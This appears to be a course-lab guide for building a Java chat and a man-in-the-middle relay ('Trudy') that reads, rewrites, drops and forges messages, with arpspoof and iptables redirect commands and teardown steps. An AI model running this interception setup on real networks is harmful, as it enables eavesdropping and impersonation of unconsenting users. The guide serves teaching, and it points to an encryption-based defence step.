# MeTM — Implementation Guide (full-duplex chat + active MITM)

This rebuilds the simulation so that:

1. **Alice and Bob chat directly over TCP, full-duplex** — either side can type at
   any time, no request/reply lockstep, and Bob no longer echoes `OK, received:`.
2. **Alice always dials Bob's *real* IP.** Nothing in her config points at the
   attacker, so the attack is undetectable at the app layer.
3. **Trudy is a transparent relay** that sits in the path via ARP spoofing +
   `iptables REDIRECT`. She can read everything, rewrite messages in flight, drop
   them, or **forge a message as Bob (to Alice) or as Alice (to Bob)** that the
   other end never sees.

Package stays `com.herrcult69.metm`. Session terminator stays the line `EOF END`.
Files live in `src/main/java/com/herrcult69/metm/`.

Addresses used throughout (change to match your `ipconfig` / `ip -br a`):

| Who   | IP              | Role                                             |
|-------|-----------------|--------------------------------------------------|
| Alice | 192.168.0.123   | client, dials Bob's real IP                      |
| Bob   | 192.168.0.152   | server, listens on 9000                          |
| Trudy | 192.168.0.x     | Kali VM, bridged to the USB-Ethernet adapter     |

---

## 1. `Log.java` — unchanged

Keep your existing `Log.java`. All three programs use it.

---

## 2. `Peer.java` — NEW, the shared full-duplex chat engine

Both Alice and Bob run this. A daemon **reader thread** prints incoming lines as
they arrive; the main thread reads your keyboard and sends. Either side ending
(`EOF END`, Ctrl+Z/Ctrl+D, or the socket closing) stops the program.

```java
package com.herrcult69.metm;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

/** Full-duplex line chat over one socket. Either side may type at any time. */
final class Peer {
    static final String END = "EOF END";

    private Peer() {
    }

    static void chat(String tag, Socket socket) throws IOException {
        try (socket;
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in))) {

            // Reader thread: print whatever the peer sends, the moment it arrives.
            Thread reader = new Thread(() -> {
                try {
                    String line;
                    while ((line = in.readLine()) != null) {
                        if (line.equals(END)) {
                            Log.info(tag, "peer ended the session (EOF END)");
                            break;
                        }
                        Log.info(tag, "<< " + line);
                    }
                } catch (IOException e) {
                    Log.error(tag, "read error: " + e);
                }
                System.exit(0);     // peer gone -> unblock the keyboard and quit
            }, tag + "-reader");
            reader.setDaemon(true);
            reader.start();

            Log.info(tag, "connected to " + socket.getRemoteSocketAddress()
                    + "; type messages, or EOF END to quit");
            while (true) {
                String msg = keyboard.readLine();
                if (msg == null) {                 // Ctrl+Z / Ctrl+D
                    out.println(END);
                    break;
                }
                msg = msg.trim();
                out.println(msg);
                if (msg.equals(END)) {
                    Log.info(tag, "you ended the session");
                    break;
                }
            }
        }
    }
}
```

---

## 3. `Alice.java` — NEW, client that dials Bob's REAL ip

The one line that matters: `host` is **Bob's real address**, never Trudy's. That
is the whole point — Alice is a naive first-year app with no idea Trudy exists.

```java
package com.herrcult69.metm;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;

public class Alice {
    private static final String TAG = "Alice";

    public static void main(String[] args) throws IOException {
        String host = args.length > 0 ? args[0] : "192.168.0.152";  // Bob's REAL ip
        int port    = args.length > 1 ? Integer.parseInt(args[1]) : 9000;

        Log.info(TAG, "dialing Bob at " + host + ":" + port + " ...");
        try (Socket socket = new Socket(host, port)) {
            Peer.chat(TAG, socket);
        } catch (ConnectException e) {
            Log.error(TAG, "cannot reach " + host + ":" + port + " (" + e.getMessage() + ")");
        }
        Log.info(TAG, "bye");
    }
}
```

Run: `java -cp target/classes com.herrcult69.metm.Alice 192.168.0.152 9000`

---

## 4. `Bob.java` — NEW, server, full-duplex, no echo

Handles one conversation then exits (restart him per scenario — matches how you
run the demo). No more `OK, received:`.

```java
package com.herrcult69.metm;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Bob {
    private static final String TAG = "Bob";

    public static void main(String[] args) throws IOException {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 9000;
        try (ServerSocket server = new ServerSocket(port)) {
            Log.info(TAG, "listening on " + port + ", waiting for one connection ...");
            Socket socket = server.accept();
            Log.info(TAG, "connection from " + socket.getRemoteSocketAddress());
            Peer.chat(TAG, socket);
        }
        Log.info(TAG, "bye");
    }
}
```

Run: `java -cp target/classes com.herrcult69.metm.Bob 9000`

---

## 5. `Trudy.java` — NEW, dual-pump relay + operator console

Two relay threads (one per direction, because the chat is full-duplex) plus a
keyboard thread that injects forged lines. `synchronized (peerOut)` keeps an
injected line from interleaving mid-line with a relayed one.

```java
package com.herrcult69.metm;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Trudy {
    private static final String TAG = "Trudy";
    private static final String END = "EOF END";

    // live attack state, toggled from Trudy's keyboard
    private static volatile String findText = null;      // /replace a=b
    private static volatile String replaceText = null;
    private static volatile String dropText = null;      // /drop xyz

    public static void main(String[] args) throws IOException {
        int listenPort = args.length > 0 ? Integer.parseInt(args[0]) : 6000;   // iptables REDIRECTs here
        String bobHost = args.length > 1 ? args[1] : "192.168.0.152";          // real Bob
        int bobPort    = args.length > 2 ? Integer.parseInt(args[2]) : 9000;

        try (ServerSocket server = new ServerSocket(listenPort)) {
            Log.info(TAG, "listening on " + listenPort + "; will relay to real Bob at "
                    + bobHost + ":" + bobPort);
            Socket alice = server.accept();
            Log.info(TAG, "Alice connected from " + alice.getRemoteSocketAddress());
            Socket bob = new Socket(bobHost, bobPort);
            Log.info(TAG, "connected onward to Bob at " + bob.getRemoteSocketAddress());

            PrintWriter toAlice = new PrintWriter(alice.getOutputStream(), true);
            PrintWriter toBob   = new PrintWriter(bob.getOutputStream(), true);
            BufferedReader fromAlice = new BufferedReader(new InputStreamReader(alice.getInputStream()));
            BufferedReader fromBob   = new BufferedReader(new InputStreamReader(bob.getInputStream()));

            // Two independent directions, because either side may speak at any time.
            Thread a2b = new Thread(() -> pump("Alice->Bob", fromAlice, toBob), "a2b");
            Thread b2a = new Thread(() -> pump("Bob->Alice", fromBob, toAlice), "b2a");
            a2b.setDaemon(true);
            b2a.setDaemon(true);
            a2b.start();
            b2a.start();

            operatorConsole(toAlice, toBob);   // Trudy's keyboard: forge lines
        }
    }

    /** Relay one direction. 'peerOut' is the far side we forward to. */
    private static void pump(String dir, BufferedReader in, PrintWriter peerOut) {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                if (line.equals(END)) {
                    Log.info(TAG, dir + ": EOF END seen, closing");
                    synchronized (peerOut) { peerOut.println(END); }
                    break;
                }
                // DROP: swallow silently, neither side is told.
                if (dropText != null && line.contains(dropText)) {
                    Log.info(TAG, dir + ": DROPPED (" + line + ")");
                    continue;
                }
                // TAMPER: rewrite in flight.
                String out = line;
                if (findText != null && line.contains(findText)) {
                    out = line.replace(findText, replaceText);
                    Log.info(TAG, dir + ": TAMPERED \"" + line + "\" -> \"" + out + "\"");
                } else {
                    Log.info(TAG, dir + ": " + line);
                }
                synchronized (peerOut) { peerOut.println(out); }
            }
        } catch (IOException e) {
            Log.error(TAG, dir + ": " + e);
        }
        System.exit(0);
    }

    /** Trudy's own keyboard: inject forged lines into either side. */
    private static void operatorConsole(PrintWriter toAlice, PrintWriter toBob) throws IOException {
        BufferedReader k = new BufferedReader(new InputStreamReader(System.in));
        help();
        String cmd;
        while ((cmd = k.readLine()) != null) {
            if (cmd.startsWith("/toalice ")) {
                String text = cmd.substring("/toalice ".length());
                synchronized (toAlice) { toAlice.println(text); }
                Log.info(TAG, "INJECTED to Alice (as Bob): " + text);
            } else if (cmd.startsWith("/tobob ")) {
                String text = cmd.substring("/tobob ".length());
                synchronized (toBob) { toBob.println(text); }
                Log.info(TAG, "INJECTED to Bob (as Alice): " + text);
            } else if (cmd.startsWith("/replace ")) {
                String body = cmd.substring("/replace ".length());
                int eq = body.indexOf('=');
                if (eq > 0) {
                    findText = body.substring(0, eq);
                    replaceText = body.substring(eq + 1);
                    Log.info(TAG, "tamper ON: \"" + findText + "\" -> \"" + replaceText + "\"");
                } else {
                    Log.info(TAG, "usage: /replace find=replacement");
                }
            } else if (cmd.equals("/noreplace")) {
                findText = null;
                replaceText = null;
                Log.info(TAG, "tamper OFF");
            } else if (cmd.startsWith("/drop ")) {
                dropText = cmd.substring("/drop ".length());
                Log.info(TAG, "drop ON for lines containing: " + dropText);
            } else if (cmd.equals("/nodrop")) {
                dropText = null;
                Log.info(TAG, "drop OFF");
            } else if (cmd.equals("/help")) {
                help();
            } else {
                Log.info(TAG, "unknown command; /help for the list");
            }
        }
    }

    private static void help() {
        Log.info(TAG, "commands: /toalice <msg>  /tobob <msg>  /replace a=b  "
                + "/noreplace  /drop x  /nodrop  /help");
    }
}
```

---

## 6. Build

Maven (from `MeTM/`):

```
mvn -q compile
```

or plain javac (from `MeTM/src/main/java`):

```
javac -d ../../../target/classes com/herrcult69/metm/*.java
```

Classes land in `target/classes`, so every run uses `-cp target/classes`.

---

## 7. Run — scenario A: baseline, no attacker

Proves the new full-duplex chat works before Trudy is involved.

- Bob's laptop:   `java -cp target/classes com.herrcult69.metm.Bob 9000`
- Alice's machine: `java -cp target/classes com.herrcult69.metm.Alice 192.168.0.152 9000`

Type on both sides, in any order. Each line appears on the other screen prefixed
`<<`. End with `EOF END` on either side.

---

## 8. Run — scenario B: active MITM (the real, undetectable path)

Alice's config is **unchanged** — she still dials 192.168.0.152:9000. ARP spoofing
puts Trudy's box in the path; `iptables REDIRECT` bends the connection into Trudy's
Java listener on 6000; Trudy opens her own socket to the real Bob.

On **Trudy** (Kali VM, interface = the USB-Ethernet one, e.g. `eth0`):

```
# 1. forward + relax reverse-path so a redirected foreign-destination packet is accepted
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv4.conf.all.rp_filter=0

# 2. ARP spoof. For the active relay only Alice must be poisoned (she must send
#    Bob's traffic to Trudy's MAC). Poisoning Bob too is harmless.
#    terminal 1:
sudo arpspoof -i eth0 -t 192.168.0.123 192.168.0.152   # tell Alice: "I am Bob"
#    terminal 2 (optional):
sudo arpspoof -i eth0 -t 192.168.0.152 192.168.0.123   # tell Bob:   "I am Alice"

# 3. redirect Alice's chat traffic (dst = Bob:9000) into Trudy's listener on 6000
sudo iptables -t nat -A PREROUTING -p tcp -d 192.168.0.152 --dport 9000 \
     -j REDIRECT --to-port 6000

# 4. start Bob first (on his laptop), then the relay, then Alice
java -cp target/classes com.herrcult69.metm.Trudy 6000 192.168.0.152 9000
```

Then start Bob (his laptop) and Alice (her machine) as in scenario A. Alice still
uses Bob's real IP.

### What Trudy can now do, live

- **Eavesdrop:** every line shows in Trudy's console as `Alice->Bob:` / `Bob->Alice:`.
- **Tamper:** type `/replace love=hate` — Alice sends "I love you bro", Bob receives
  "I hate you bro". `/noreplace` to stop.
- **Drop (sabotage):** `/drop meet` — any line containing "meet" never arrives;
  neither side is told.
- **Forge as Bob:** `/toalice sorry, who is this?` — appears on Alice's screen as if
  Bob typed it. Bob never sees it.
- **Forge as Alice:** `/tobob transfer 500 to Trudy` — appears on Bob's screen as if
  Alice typed it. Alice never sees it.

### Why it is undetectable

Alice dialed Bob's real IP and got a working chat with "Bob"; there is no second
address, no certificate, no MAC shown in the app, nothing for her to check. The
only artifact is that **Bob sees the TCP source as Trudy's IP**, not Alice's — and
the chat app never surfaces that. Full IP transparency (Bob seeing Alice's IP)
would need TPROXY and is out of scope; worth naming as a limitation in the defense.
This is exactly the gap Step 3 closes: AES + HMAC (and endpoint auth) give the two
ends something to verify, after which tamper is rejected and forgery fails.

---

## 9. Teardown (run before anyone else uses the network)

```
# remove the redirect
sudo iptables -t nat -D PREROUTING -p tcp -d 192.168.0.152 --dport 9000 \
     -j REDIRECT --to-port 6000
# Ctrl+C both arpspoof windows (they send corrective ARP on the way out)
sudo sysctl -w net.ipv4.ip_forward=0
# on Alice and Bob, clear the poisoned cache (Command Prompt as admin):
arp -d *
```

---

## 10. Quick bench test without spoofing (optional)

To rehearse the relay logic on two machines with no ARP/iptables: point Alice
straight at Trudy, and tell Trudy to listen on 9000.

- Trudy: `java -cp target/classes com.herrcult69.metm.Trudy 9000 192.168.0.152 9000`
- Alice: `java -cp target/classes com.herrcult69.metm.Alice <TRUDY_IP> 9000`
- Bob:   `java -cp target/classes com.herrcult69.metm.Bob 9000`

Same console commands work. This skips the "undetectable" property (Alice is
openly dialing Trudy) but exercises every relay/forge/tamper path.
